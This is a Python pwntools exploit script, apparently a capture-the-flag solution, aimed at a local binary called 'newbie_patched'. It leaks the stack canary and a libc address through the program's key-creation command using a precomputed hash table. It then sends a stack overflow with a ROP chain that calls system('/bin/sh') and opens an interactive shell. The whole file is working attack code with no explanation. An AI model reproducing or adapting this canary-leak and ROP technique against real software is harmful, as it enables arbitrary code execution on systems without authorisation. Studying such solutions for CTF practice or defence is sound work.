#!/usr/bin/env python3


from pwn import *


e = ELF("./newbie_patched")
r = process("./newbie_patched")
libc = ELF("./libc-2.27.so")
file_handle = open("./hash.txt","r")
a = file_handle.read().split("\n")
file_handle.close()
i = 49
canary= 0
libc_address = 0
while(i < 53):
    r.sendlineafter(b">",f"id {i}")
    r.sendlineafter(b">",b"create")
    r.recvuntil(b"Your key: ")
    key = r.recvline().strip().decode()
    canary+= (a.index(key)) << ((i - 49) * 16)
    i+=1
i = 73
while(i < 77):
    r.sendlineafter(b">",f"id {i}")
    r.sendlineafter(b">",b"create")
    r.recvuntil(b"Your key: ")
    key = r.recvline().strip().decode()
    libc_address+= (a.index(key)) << ((i - 73) * 16)
    i+=1
libc_base = libc_address - 0x21bf7
log.info("The leaked canary of the process is " + hex(canary))
log.info("The libc leak of the process is " + hex(libc_address))
log.info("The libc base of the process is " + hex(libc_base))
exploit=b'A' * 88 + p64(canary) + p64(0) +  p64(libc_base + 0x215c0) + p64(libc_base + 0x215bf) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(libc_base + libc.sym.system) 
r.sendline(exploit)
#r.sendline(b"quit")
r.interactive()
